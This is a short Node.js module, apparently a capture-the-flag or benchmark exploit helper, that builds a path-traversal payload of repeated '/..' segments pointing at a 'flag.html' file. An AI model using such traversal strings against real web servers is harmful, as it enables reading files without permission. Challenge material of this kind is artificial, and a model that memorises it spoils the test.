function getPayload() {
  const path = require('path'); // Ensure path is required
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  function genstr(n) {
    return "/..".repeat(50) + pathToFlag;
  }
  return { genstr };
}

module.exports = { getPayload };